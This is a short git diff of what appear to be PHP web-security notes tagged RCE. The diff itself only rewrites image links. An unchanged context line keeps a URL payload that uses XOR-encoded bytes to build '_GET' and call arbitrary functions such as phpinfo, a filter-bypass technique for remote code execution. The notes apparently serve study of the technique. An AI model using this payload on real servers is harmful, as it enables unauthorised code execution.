@@ -1,4 +1,4 @@
-![[Pasted image 20230124085428.png|500]]
+![](<./img/Pasted image 20230124085428.png>)
 
 ```php
 <?php
@@ -89,6 +89,6 @@ php test.php _GET
 /?_=${%80%80%80%80^%DF%C7%C5%D4}{%80}();&%80=phpinfo
 ```
 
-![[Pasted image 20230124103517.png|1000]]
+![](<./img/Pasted image 20230124103517.png>)
 
 #Web #PHP #RCE
